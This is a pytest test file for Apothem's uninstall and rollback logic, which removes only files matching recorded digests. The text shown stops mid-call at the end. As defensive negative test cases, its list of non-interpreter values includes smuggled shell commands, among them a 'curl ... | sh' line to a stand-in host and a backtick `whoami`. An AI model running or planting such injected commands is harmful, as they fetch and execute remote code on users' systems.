# SPDX-License-Identifier: MIT

"""An uninstall removes only what the install record shows Apothem wrote.

Each install record carries the SHA-256 of every file the install wrote. An
uninstall removes a file only while it still has that content, so the
operator's own files survive whatever happened in between: a partial uninstall,
a folder cleaned by hand, a rollback, a link to a dotfiles folder. An uninstall
that does not finish appends an ``uninstall-incomplete`` record, which a second
run, an install, an update or a rollback supersedes.
"""

from __future__ import annotations

import errno
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
from click.testing import CliRunner

from apothem import cli
from apothem.harnesses._shared import install_driver, install_driver_lifecycle
from apothem.harnesses._shared import install_driver_blocks as blocks
from apothem.harnesses._shared import install_driver_written as written
from apothem.harnesses.claude_code import ClaudeCodeAdapter
from apothem.lib import install_ledger
from apothem.lib.harness_materializer import (
    APOTHEM_BLOCK_BEGIN,
    APOTHEM_BLOCK_END,
    wrap_managed_block,
)
from apothem.lib.install_ledger import LedgerRecord, LedgerTarget


@pytest.fixture
def claude(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Point the user home and the backup root into *tmp_path*; return ``~/.claude``."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setattr(install_driver, "BACKUP_ROOT", tmp_path / "apothem-backups")
    return home / ".claude"


def _link_folder(link: Path, target: Path) -> None:
    if sys.platform == "win32":
        import _winapi

        _winapi.CreateJunction(str(target), str(link))
    else:
        link.symlink_to(target, target_is_directory=True)


def _unlink_folder(link: Path) -> None:
    link.rmdir() if sys.platform == "win32" else link.unlink()


def _run(*args: str) -> tuple[int, dict]:  # type: ignore[type-arg]
    result = CliRunner().invoke(cli.main, [*args, "--format", "json"])
    return result.exit_code, json.loads(result.output)


def _uninstall() -> tuple[int, dict]:  # type: ignore[type-arg]
    return _run("uninstall", "--harness", "claude-code", "--yes")


def _root(claude: Path) -> str:
    return str(claude)


def _unfinished(claude: Path) -> LedgerRecord | None:
    return install_ledger.unfinished_uninstall("claude_code", root=_root(claude))


def _partial_uninstall(claude: Path, tmp_path: Path) -> tuple[Path, Path]:
    """Install, link ``~/.claude/rules`` to a dotfiles folder, uninstall (partial)."""
    ClaudeCodeAdapter().install({})
    rules = claude / "rules"
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)
    code, _ = _uninstall()
    assert code == cli._EXIT_PARTIAL
    return rules, dotfiles


def _restore_link(rules: Path, dotfiles: Path) -> None:
    _unlink_folder(rules)
    shutil.move(str(dotfiles), str(rules))


def _skill_name() -> str:
    return sorted(
        path.name
        for path in Path("src/apothem/skills").iterdir()
        if path.is_dir() and not path.name.startswith("_")
    )[0]


def _add_users_files(claude: Path, rule_name: str) -> list[Path]:
    """Write the operator's own files where Apothem's used to be."""
    skill = claude / "skills" / _skill_name()
    skill.mkdir(parents=True, exist_ok=True)
    agents = claude / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    rules = claude / "rules"
    rules.mkdir(parents=True, exist_ok=True)
    mine = [
        skill / "my-notes.md",
        agents / "citation-auditor.md",
        rules / rule_name,
    ]
    for path in mine:
        path.write_text("mine\n", encoding="utf-8")
    return mine


def test_a_target_records_digests_and_older_records_still_load() -> None:
    target = LedgerTarget(
        path="/x/skills/a",
        mode="merge_tree_entries",
        ownership_class="apothem-owned",
        files={"SKILL.md": "ab", "ref/b.md": "cd"},
    )
    older = {"path": "/x/a.md", "mode": "write_text", "ownership_class": "generated"}

    again = LedgerTarget.from_dict(json.loads(json.dumps(target.to_dict())))
    loaded = LedgerTarget.from_dict(older)

    assert again == target
    assert again.files == {"SKILL.md": "ab", "ref/b.md": "cd"}
    assert loaded.digest is None
    assert loaded.files is None


def test_an_install_records_what_it_wrote(claude: Path) -> None:
    ClaudeCodeAdapter().install({})

    record = install_ledger.current_install_record("claude_code", root=_root(claude))

    assert record is not None
    skill = next(t for t in record.targets if t.path.endswith(_skill_name()))
    assert skill.files
    assert all(len(digest) == 64 for digest in skill.files.values())
    agent = next(t for t in record.targets if t.path.endswith("citation-auditor.md"))
    assert agent.digest is not None


def test_a_hand_cleaned_partial_uninstall_keeps_the_users_files(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    rule_name = sorted(path.name for path in dotfiles.iterdir())[0]
    _unlink_folder(rules)
    shutil.rmtree(claude)
    mine = _add_users_files(claude, rule_name)
    (claude / "CLAUDE.md").write_text("my own CLAUDE.md\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)
    assert (claude / "CLAUDE.md").read_text(encoding="utf-8") == "my own CLAUDE.md\n"
    assert ClaudeCodeAdapter().is_installed() is False


def test_the_users_files_survive_an_uninstall_after_a_rollback(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _restore_link(rules, dotfiles)

    rolled = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes"]
    )
    cleared = _unfinished(claude)
    mine = _add_users_files(claude, "my-rule.md")
    code, envelope = _uninstall()

    assert rolled.exit_code == 0, rolled.output
    assert cleared is None
    assert code in (0, cli._EXIT_PARTIAL), envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)


@pytest.mark.parametrize("command", ["install", "update"])
def test_an_install_or_update_clears_the_unfinished_uninstall(
    claude: Path, tmp_path: Path, command: str
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    before = _unfinished(claude)
    _restore_link(rules, dotfiles)

    adapter = ClaudeCodeAdapter()
    run = adapter.install({}) if command == "install" else adapter.update({})

    assert before is not None
    assert not run.errors, run.errors
    assert _unfinished(claude) is None
    code, envelope = _uninstall()
    assert code == 0, envelope
    assert ClaudeCodeAdapter().is_installed() is False


def test_a_finished_retry_clears_the_unfinished_uninstall(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _restore_link(rules, dotfiles)

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert _unfinished(claude) is None
    assert ClaudeCodeAdapter().is_installed() is False
    assert not rules.exists() or not any(rules.iterdir())


def test_a_link_holding_only_the_users_files_lets_the_uninstall_finish(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    rules = claude / "rules"
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)
    edited, *others = sorted(dotfiles.iterdir())
    for path in others:
        shutil.rmtree(path) if path.is_dir() else path.unlink()
    edited.write_text("my edits\n", encoding="utf-8")
    mine = dotfiles / "my-own-rule.md"
    mine.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()
    again, _ = _uninstall()

    assert code == 0, envelope
    assert envelope["status"] == "success"
    messages = [str(w["message"]) for w in envelope["warnings"]]
    assert any(str(rules) in message for message in messages), messages
    assert again == 0
    assert mine.read_text(encoding="utf-8") == "mine\n"
    assert edited.read_text(encoding="utf-8") == "my edits\n"
    assert ClaudeCodeAdapter().is_installed() is False


def test_a_cleared_link_reads_as_not_installed(claude: Path, tmp_path: Path) -> None:
    _, dotfiles = _partial_uninstall(claude, tmp_path)
    for path in list(dotfiles.iterdir()):
        shutil.rmtree(path) if path.is_dir() else path.unlink()
    mine = dotfiles / "my-own-rule.md"
    mine.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert [r["outcome"] for r in envelope["results"]] == ["skipped"]
    assert mine.read_text(encoding="utf-8") == "mine\n"


def test_a_linked_whole_home_folder_is_left_as_it_is(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    dotfiles = tmp_path / "dotfiles" / ".claude"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(claude), str(dotfiles))
    _link_folder(claude, dotfiles)
    before = sorted(str(path) for path in dotfiles.rglob("*"))

    code, envelope = _uninstall()

    assert code in (cli._EXIT_PARTIAL, cli._EXIT_EXPECTED), envelope
    assert sorted(str(path) for path in dotfiles.rglob("*")) == before


def test_an_exception_mid_uninstall_keeps_the_install_for_a_retry(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    real = written.backup_existing
    calls = {"n": 0}

    def fails_third(*args: object, **kwargs: object) -> object:
        calls["n"] += 1
        if calls["n"] == 3:
            raise OSError("backup disk full")
        return real(*args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(written, "backup_existing", fails_third)
    code, envelope = _uninstall()
    monkeypatch.setattr(written, "backup_existing", real)
    unfinished = _unfinished(claude)
    installed = ClaudeCodeAdapter().is_installed()
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert envelope["results"][0]["outcome"] == "error"
    assert unfinished is not None
    assert unfinished.targets
    assert installed is True
    assert retry_code == 0, retry
    assert ClaudeCodeAdapter().is_installed() is False
    assert not (claude / "agents" / "citation-auditor.md").exists()


def test_a_failed_step_with_the_rest_removed_is_partial(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    real = install_driver_lifecycle.remove_written
    calls = {"n": 0}

    def fails_third(target: Path, **kwargs: object) -> object:
        calls["n"] += 1
        if calls["n"] == 3:
            return install_driver._result(
                "error", "remove", target, "simulated failure"
            )
        return real(target, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_driver_lifecycle, "remove_written", fails_third)
    code, envelope = _uninstall()
    monkeypatch.setattr(install_driver_lifecycle, "remove_written", real)
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert envelope["results"][0]["outcome"] == "error"
    assert retry_code == 0, retry


def test_a_changed_apothem_file_is_kept_and_named(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("my edits\n", encoding="utf-8")
    skill = claude / "skills" / _skill_name()
    notes = skill / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert agent.read_text(encoding="utf-8") == "my edits\n"
    assert notes.read_text(encoding="utf-8") == "mine\n"
    assert sorted(path.name for path in skill.iterdir()) == ["my-notes.md"]
    named = [str(path) for w in envelope["warnings"] for path in w["paths"]]
    assert str(agent) in named
    assert str(skill) in named


def test_json_warnings_are_grouped_like_the_plain_output(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    agents = sorted((claude / "agents").iterdir())[:3]
    for agent in agents:
        agent.write_text("my edits\n", encoding="utf-8")

    code, envelope = _uninstall()
    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert code == 0, envelope
    changed = [w for w in envelope["warnings"] if w.get("count") == 3]
    assert len(changed) == 1
    assert sorted(changed[0]["paths"]) == sorted(str(a) for a in agents)
    assert plain.exit_code == 0


def test_files_the_install_ignores_are_never_recorded_as_apothems(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    mine = [skill / "README.md", skill / "AGENTS.md", skill / "__pycache__" / "x.pyc"]
    mine[2].parent.mkdir()
    for path in mine:
        path.write_text("mine\n", encoding="utf-8")

    ClaudeCodeAdapter().install({})
    record = install_ledger.current_install_record("claude_code", root=_root(claude))
    code, envelope = _uninstall()

    assert record is not None
    recorded = next(t for t in record.targets if t.path == str(skill))
    assert recorded.files is not None
    assert not {"README.md", "AGENTS.md", "__pycache__/x.pyc"} & set(recorded.files)
    assert code == 0, envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)


def test_a_file_that_cannot_be_removed_leaves_the_uninstall_unfinished(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    stuck = claude / "agents" / "citation-auditor.md"
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    monkeypatch.setattr(Path, "unlink", refuse)
    code, envelope = _uninstall()
    monkeypatch.setattr(Path, "unlink", real_unlink)
    unfinished = _unfinished(claude)
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["results"][0]["outcome"] == "error"
    assert unfinished is not None
    assert retry_code == 0, retry
    assert not stuck.exists()


def test_recreated_files_alone_do_not_keep_an_unfinished_uninstall_installed(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _unlink_folder(rules)
    shutil.rmtree(dotfiles)
    (claude / "settings.json").write_text("{}\n", encoding="utf-8")
    (claude / "CLAUDE.md").write_text("", encoding="utf-8")

    installed = ClaudeCodeAdapter().is_installed()
    code, _ = _uninstall()

    assert installed is False
    assert code == 0
    assert (claude / "settings.json").read_text(encoding="utf-8") == "{}\n"
    assert (claude / "CLAUDE.md").exists()


def test_a_failed_installs_own_rollback_does_not_clear_the_unfinished_state(
    claude: Path, tmp_path: Path
) -> None:
    _partial_uninstall(claude, tmp_path)
    install_ledger.append_record(
        LedgerRecord.create(harness="claude_code", root=_root(claude), kind="rollback")
    )

    assert _unfinished(claude) is not None


@pytest.mark.parametrize("later", ["rollback", "uninstall-incomplete"])
def test_a_still_active_install_keeps_the_shared_data_home(
    tmp_path: Path, later: str
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    project = tmp_path / "project"
    home = project / ".apothem"
    first = LedgerRecord.create(
        harness="windsurf", root=project, kind="install", data_home=str(home)
    )
    second = LedgerRecord.create(
        harness="windsurf", root=project, kind="install", data_home=str(home)
    )
    install_ledger.append_record(first)
    install_ledger.append_record(second)
    install_ledger.append_record(
        LedgerRecord.create(
            harness="windsurf",
            root=project,
            kind=later,  # type: ignore[arg-type]
            install_id=second.install_id,
        )
    )

    shared = datahome._other_harness_shares_home(
        current_harness="cursor", shared_home=home
    )

    assert shared is True


def test_the_same_harness_at_another_root_keeps_the_shared_data_home(
    claude: Path, tmp_path: Path
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    home = Path.home() / ".apothem"
    first, second = tmp_path / "a", tmp_path / "b"
    for root in (first, second):
        install_ledger.append_record(
            LedgerRecord.create(
                harness="cursor", root=root, kind="install", data_home=str(home)
            )
        )

    shared = datahome._other_harness_shares_home(
        current_harness="cursor", shared_home=home, current_root=first
    )
    alone = datahome._other_harness_shares_home(
        current_harness="cursor", shared_home=tmp_path / "elsewhere", current_root=first
    )

    assert shared is True
    assert alone is False


def _rollback(*extra: str) -> tuple[int, dict]:  # type: ignore[type-arg]
    return _run("rollback", "--harness", "claude-code", "--yes", *extra)


def test_a_second_rollback_reverses_the_earlier_install_and_keeps_the_users_files(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    shutil.rmtree(skill)
    ClaudeCodeAdapter().install({})
    later = install_ledger.current_install_record("claude_code", root=_root(claude))

    first_code, first = _rollback()
    again_code, again = _rollback("--install-id", str(later.install_id))  # type: ignore[union-attr]
    skill.mkdir(parents=True, exist_ok=True)
    mine = skill / "my-notes.md"
    mine.write_text("mine\n", encoding="utf-8")
    second_code, second = _rollback()

    assert first_code == 0, first
    assert second_code == 0, second
    assert mine.read_text(encoding="utf-8") == "mine\n"
    assert again_code != 0, again
    assert "already" in json.dumps(again)


def test_a_rollback_after_a_hand_cleaned_partial_uninstall_keeps_the_users_files(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    rule_name = sorted(path.name for path in dotfiles.iterdir())[0]
    _unlink_folder(rules)
    shutil.rmtree(claude)
    mine = _add_users_files(claude, rule_name)
    (claude / "CLAUDE.md").write_text("my own CLAUDE.md\n", encoding="utf-8")

    code, envelope = _rollback()

    assert code in (0, cli._EXIT_PARTIAL, cli._EXIT_EXPECTED), envelope
    assert all(path.read_text(encoding="utf-8") == "mine\n" for path in mine)
    assert (claude / "CLAUDE.md").read_text(encoding="utf-8") == "my own CLAUDE.md\n"


def _strip_digests(claude: Path) -> None:
    """Rewrite the ledger as an earlier release wrote it: no file digests."""
    path = install_ledger.ledger_path("claude_code")
    lines = []
    for line in path.read_text(encoding="utf-8").splitlines():
        record = json.loads(line)
        for target in record.get("targets", []):
            target.pop("digest", None)
            target.pop("files", None)
        lines.append(json.dumps(record))
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def test_an_earlier_release_install_is_removed_where_the_bytes_match(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    skill = claude / "skills" / _skill_name()
    notes = skill / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert not agent.exists()
    assert sorted(path.name for path in skill.iterdir()) == ["my-notes.md"]
    assert ClaudeCodeAdapter().is_installed() is False


def test_an_earlier_release_file_that_differs_leaves_the_uninstall_unfinished(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("an earlier release wrote this\n", encoding="utf-8")

    code, envelope = _uninstall()
    unfinished = _unfinished(claude)
    installed = ClaudeCodeAdapter().is_installed()

    assert code == cli._EXIT_PARTIAL, envelope
    assert envelope["status"] == "partial"
    assert agent.read_text(encoding="utf-8") == "an earlier release wrote this\n"
    assert unfinished is not None
    assert installed is True
    messages = " ".join(str(w["message"]) for w in envelope["warnings"])
    assert "apothem update" in messages


def test_a_hand_cleaned_unfinished_uninstall_is_closed(
    claude: Path, tmp_path: Path
) -> None:
    rules, dotfiles = _partial_uninstall(claude, tmp_path)
    _unlink_folder(rules)
    shutil.rmtree(dotfiles)
    shutil.rmtree(claude)

    installed = ClaudeCodeAdapter().is_installed()

    assert installed is False
    assert _unfinished(claude) is None
    assert (
        install_ledger.current_install_record("claude_code", root=_root(claude)) is None
    )


def test_an_empty_folder_of_the_users_inside_a_skill_goes_with_it(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    (skill / "my-drafts" / "deeper").mkdir(parents=True)

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert not skill.exists()
    assert all(str(skill) not in str(w["message"]) for w in envelope["warnings"])


def test_emptying_a_folder_never_removes_through_a_link(tmp_path: Path) -> None:
    folder = tmp_path / "skill"
    (folder / "empty").mkdir(parents=True)
    ours = folder / "SKILL.md"
    ours.write_bytes(b"ours\n")
    outside = tmp_path / "outside"
    (outside / "empty-too").mkdir(parents=True)
    _link_folder(folder / "linked", outside)

    kept_files, kept_links = written._remove_matching(folder, [ours])

    assert kept_files == []
    assert kept_links == [folder / "linked"]
    assert not ours.exists()
    assert not (folder / "empty").exists()
    assert (outside / "empty-too").is_dir()


def test_kept_files_are_named_in_the_plain_output(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    notes = claude / "skills" / _skill_name() / "my-notes.md"
    notes.write_text("mine\n", encoding="utf-8")

    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert result.exit_code == 0, result.output
    assert "my-notes.md" in result.output


def test_an_earlier_release_install_of_shared_skills_is_removed(claude: Path) -> None:
    from apothem.harnesses.codex import CodexAdapter

    CodexAdapter().install({})
    path = install_ledger.ledger_path("codex")
    records = [
        json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()
    ]
    for record in records:
        for target in record.get("targets", []):
            target.pop("digest", None)
            target.pop("files", None)
    path.write_text("".join(json.dumps(r) + "\n" for r in records), encoding="utf-8")
    skills = Path.home() / ".agents" / "skills"

    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "codex", "--yes", "--format", "json"]
    )

    assert result.exit_code == 0, result.output
    assert not skills.exists() or not any(skills.rglob("SKILL.md"))


def test_an_earlier_release_file_edited_at_an_unfilled_token_stays(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    edited = next(
        path
        for path in sorted((claude / "skills").glob("*/SKILL.md"))
        if "${CLAUDE_SKILL_DIR}" in path.read_text(encoding="utf-8")
    )
    text = edited.read_text(encoding="utf-8").replace(
        "${CLAUDE_SKILL_DIR}", "/my/own/notes", 1
    )
    edited.write_text(text, encoding="utf-8")

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert edited.read_text(encoding="utf-8") == text


def test_an_exception_in_the_shared_skills_keeps_what_was_removed(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from apothem.harnesses.codex import CodexAdapter

    CodexAdapter().install({})
    real = install_driver_lifecycle.remove_written
    calls = {"n": 0}

    def fails_fourth(target: Path, **kwargs: object) -> object:
        if ".agents" in target.parts:
            calls["n"] += 1
            if calls["n"] == 4:
                raise OSError("disk went away")
        return real(target, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_driver_lifecycle, "remove_written", fails_fourth)
    result = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "codex", "--yes", "--format", "json"]
    )
    unfinished = install_ledger.unfinished_uninstall(
        "codex", root=str(Path.home() / ".codex")
    )

    assert result.exit_code == cli._EXIT_PARTIAL, result.output
    assert unfinished is not None
    shared = [t for t in unfinished.targets if ".agents" in Path(t.path).parts]
    assert len(shared) >= 3


def test_a_rollback_names_the_files_it_kept(claude: Path) -> None:
    notes = claude / "skills" / _skill_name() / "my-notes.md"
    ClaudeCodeAdapter().install({})
    notes.write_text("mine\n", encoding="utf-8")
    plain = CliRunner().invoke(
        cli.main, ["rollback", "--harness", "claude-code", "--yes", "--no-color"]
    )
    plain_kept = notes.read_text(encoding="utf-8")
    # A folder the next install creates afresh (the first one now holds only
    # the notes, so that install replaces it and its rollback restores it).
    ClaudeCodeAdapter().install({})
    other = sorted(
        path
        for path in (claude / "skills").iterdir()
        if path.is_dir() and path.name != notes.parent.name
    )[0]
    other_notes = other / "my-notes.md"
    other_notes.write_text("mine\n", encoding="utf-8")

    code, envelope = _rollback()

    assert plain.exit_code == 0, plain.output
    assert plain_kept == "mine\n"
    assert str(notes) in plain.output
    assert code == 0, envelope
    assert other_notes.read_text(encoding="utf-8") == "mine\n"
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(other_notes) in listed


_BS = "\\"

#: Interpreter values installs wrote, now and in earlier releases: each one
#: compares as Apothem's. ``py -3`` is the one bare launcher a release wrote
#: where the check reads (the statusline, v1.0.1 to v1.1.0).
_INTERPRETER_VALUES = (
    "py -3",
    "/usr/bin/python3",
    "/usr/bin/python3.12",
    "/opt/homebrew/bin/python3",
    "/opt/homebrew/Cellar/python@3.12/3.12.7_1/Frameworks/Python.framework/"
    "Versions/3.12/bin/python3.12",
    "/Library/Frameworks/Python.framework/Versions/3.12/Resources/Python.app/"
    "Contents/MacOS/Python",
    "C:/Users/u/proj/.venv/Scripts/python.exe",
    "/home/u/proj/.venv/bin/python",
    "C:/Users/u/miniconda3/envs/x/python.exe",
    "/home/u/miniconda3/bin/python3.12",
    "C:/Python312/pythonw.exe",
    "C:/Users/u/AppData/Local/Microsoft/WindowsApps/"
    "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0/python.exe",
    "C:/Users/u/AppData/Local/Microsoft/WindowsApps/"
    "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0/python3.12.exe",
    "C:/Users/JOHNSM~1/AppData/Local/MICROS~1/WINDOW~1/PYTHON~1.312/PYTHON~1.EXE",
    "C:/PROGRA~1/Python312/python.exe",
    "C:/Program Files/Python314/python.exe",
    "C:/Program Files (x86)/Python312/python.exe",
    "C:/Users/O'Brien/AppData/Local/Programs/Python/Python314/python.exe",
    "C:/Users/\u00c9lodie/\u0623\u062d\u0645\u062f/python.exe",
    "/opt/my env (x)/~/caf\u00e9/python3.12",
    "~/py/bin/python3",
    "C:/Users/u/AppData/Local/Python/pythoncore-3.14-64/python.exe",
    "/home/u/.local/share/uv/python/"
    "cpython-3.13.0+freethreaded-linux-x86_64-gnu/bin/python3.13t",
    "C:/Python313/python3.13t.exe",
    "/usr/bin/python3.12-dbg",
    "C:/Python312/python_d.exe",
    "/Library/Frameworks/Python.framework/Versions/3.12/bin/python3.12-intel64",
    "C:/PY/PYTHON.EXE",
    "//server/share/Python312/python.exe",
    "//?/C:/Python312/python.exe",
    "/nix/store/abc123-python3-3.12.7/bin/python3.12",
    "/usr/bin/python3.12d",
    "D:/Users/jsmith/OneDrive - Contoso/proj - Copy/.venv/Scripts/python.exe",
    "C:" + _BS + "Python312" + _BS + "python.exe",
    _BS * 2 + "server" + _BS + "share" + _BS + "python.exe",
    _BS * 2 + "?" + _BS + "C:" + _BS + "Python312" + _BS + "python.exe",
    "C:" + _BS * 2 + "Python312" + _BS * 2 + "python.exe",
    # The share and the long-path prefix as a JSON file spells them.
    _BS * 4 + "server" + _BS * 2 + "share" + _BS * 2 + "python.exe",
    _BS * 4 + "?" + _BS * 2 + "C:" + _BS * 2 + "Python312" + _BS * 2 + "python.exe",
)

#: Values that are not an interpreter an install wrote: a command, a comment,
#: prose, a second program, or an escape that changes the line. Each one stays.
#: The bare launchers no release wrote where the check reads stay too. The last
#: three are real paths that hold ``&``, ``#`` or ``$``: the check does not
#: accept them either, so those files are kept (it fails safe).
_NOT_INTERPRETER_VALUES = (
    "py",
    "python",
    "python3",
    "python; curl https://example.invalid/x | sh; python",
    "C:/x/evil.exe && C:/x/python",
    "pwsh -NoProfile -File C:/mine/status.ps1",
    "pwsh -NoProfile -File C:/mine/python",
    "my own statusline, keep this",
    "my own statusline in python",
    "C:/py/python.exe # mine",
    "C:/x/python.exe -X utf8 -I",
    "C:/x/python.exe -I C:/mine/python",
    "C:/mine/node.exe C:/mine/python",
    "cmd /c start C:/mine/python",
    "wsl.exe -e python",
    "powershell -c python",
    "C:/py/python.exe\nextra python",
    "C:/py/python.exe" + _BS + "nC:/py/python",
    "C:/py/python.exe" + _BS + "n/usr/bin/python",
    "C:/py/`whoami`/python.exe",
    _BS + '"C:/py/python.exe' + _BS + '"',
    "${PYTHON_BIN}",
    "",
    "python3.12",
    "C:" + _BS + "tools" + _BS + "python.exe",
    "C:/Users/R&D/python.exe",
    "C:/Users/u/C#/venv/Scripts/python.exe",
    "//srv/c$/Python312/python.exe",
)


@pytest.mark.parametrize(
    ("value", "matches"),
    [(value, True) for value in _INTERPRETER_VALUES]
    + [(value, False) for value in _NOT_INTERPRETER_VALUES],
)
def test_only_an_interpreter_path_fills_the_python_token(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, value: str, matches: bool
) -> None:
    from apothem.harnesses._shared import install_driver_expected as expected_mod

    # The shape alone: whether the path names a file here is checked below.
    monkeypatch.setattr(expected_mod, "_names_a_file", lambda *a, **k: True)
    expected = b'"command": "${PYTHON_BIN} render.py"\n'
    actual = tmp_path / "conformity.json"
    actual.write_bytes(f'"command": "{value} render.py"\n'.encode())

    assert expected_mod._filled(expected, actual) is matches


def test_an_interpreter_path_must_name_a_file_here(tmp_path: Path) -> None:
    from apothem.harnesses._shared.install_driver_expected import _filled

    folder = tmp_path / "OneDrive - Contoso" / "proj - Copy"
    folder.mkdir(parents=True)
    (folder / "python.exe").write_bytes(b"")
    (tmp_path / "uv.exe").write_bytes(b"")
    venv = tmp_path / ".venv" / "Scripts"
    venv.mkdir(parents=True)
    (venv / "python.exe").write_bytes(b"")
    expected = b'"command": "${PYTHON_BIN} render.py"\n'
    actual = tmp_path / "conformity.json"
    root = tmp_path.as_posix()

    def fills(value: str) -> bool:
        actual.write_bytes(f'"command": "{value} render.py"\n'.encode())
        return _filled(expected, actual)

    assert fills(f"{root}/OneDrive - Contoso/proj - Copy/python.exe")
    assert fills("py -3")
    assert not fills("python3")
    assert not fills("py")
    assert not fills(f"{root}/uv.exe run .venv/Scripts/python.exe")
    assert not fills(f"{root}/.venv/Scripts/python.exe -I/mine/python")
    assert not fills(f"{root}/node ~/python")
    assert not fills(f"{root}/gone/python.exe")


@pytest.mark.skipif(
    sys.platform != "win32", reason="a backslash separates only on Windows"
)
def test_a_json_file_reads_a_doubled_backslash_as_one(tmp_path: Path) -> None:
    from apothem.harnesses._shared.install_driver_expected import _filled

    interpreter = tmp_path / "Python312" / "python.exe"
    interpreter.parent.mkdir()
    interpreter.write_bytes(b"")
    expected = b'"command": "${PYTHON_BIN} render.py"\n'
    actual = tmp_path / "conformity.json"

    def fills(path: str) -> bool:
        doubled = path.replace("\\", "\\\\")
        actual.write_bytes(f'"command": "{doubled} render.py"\n'.encode())
        return _filled(expected, actual)

    assert fills(str(interpreter))
    assert fills("\\\\?\\" + str(interpreter))


@pytest.mark.parametrize("live_holder", [False, True])
def test_a_store_held_by_a_deleted_project_says_how_to_release_it(
    claude: Path, tmp_path: Path, live_holder: bool
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    home = Path.home() / ".apothem"
    (home / "memory").mkdir(parents=True)
    (home / "memory" / "note.md").write_text("kept\n", encoding="utf-8")
    current, gone, live = tmp_path / "a", tmp_path / "gone", tmp_path / "live"
    current.mkdir()
    live.mkdir()
    for root in (current, gone, *((live,) if live_holder else ())):
        install_ledger.append_record(
            LedgerRecord.create(
                harness="cursor", root=root, kind="install", data_home=str(home)
            )
        )

    result = datahome._remove_data_home(
